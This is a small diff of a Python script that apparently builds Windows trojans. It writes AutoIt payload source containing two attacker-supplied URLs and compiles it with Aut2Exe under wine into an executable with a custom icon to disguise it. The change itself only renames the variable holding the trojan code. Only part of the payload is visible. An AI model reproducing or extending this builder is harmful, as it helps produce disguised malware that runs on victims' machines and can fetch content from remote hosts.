@@ -7,7 +7,7 @@ import zipfile
 TROJAN_SOURCE_CODE_FILE = "trojan.txt"
 AUT2EXE = "/root/.wine/drive_c/Program Files (x86)/AutoIt3/Aut2Exe/Aut2exe.exe"
 
-trojan_code = """
+TROJAN_CODE = """
 #include <StaticConstants.au3>
 #include <WindowsConstants.au3>
 Local $urlsArray = StringSplit($urls, ",", 2 )
@@ -38,7 +38,7 @@ class Trojan:
 	def create(self):
 		urls = 'Local $urls = "' +  self.url1 + "," +self.url2 + '"\n'
 		with open(TROJAN_SOURCE_CODE_FILE, "w") as trojan_file:
-			trojan_file.write(urls + trojan_code)
+			trojan_file.write(urls + TROJAN_CODE)
 
 	def compile(self):
 		subprocess.call('wine "' + AUT2EXE + '" /In "' + TROJAN_SOURCE_CODE_FILE + '" /Out "' + self.out_file +'" /Icon "' + self.icon + '"' , shell=True)
